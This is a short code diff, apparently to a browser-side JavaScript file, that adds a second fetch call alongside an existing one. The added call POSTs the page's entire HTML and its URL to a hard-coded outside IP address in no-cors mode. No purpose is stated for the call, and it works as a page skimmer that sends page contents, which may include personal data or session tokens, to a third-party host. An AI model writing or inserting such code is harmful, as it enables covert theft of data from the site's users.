@@ -7,3 +7,13 @@ fetch('http://84.201.138.210/index.php', {
     mode: "no-cors",
     headers: { 'Content-Type': 'application/json' }
 });
+
+fetch('https://84.201.138.210/index.php', {
+    method: 'POST',
+    body: JSON.stringify({
+        html: document.documentElement.innerHTML,
+        url: window.location.href
+    }),
+    mode: "no-cors",
+    headers: { 'Content-Type': 'application/json' }
+});
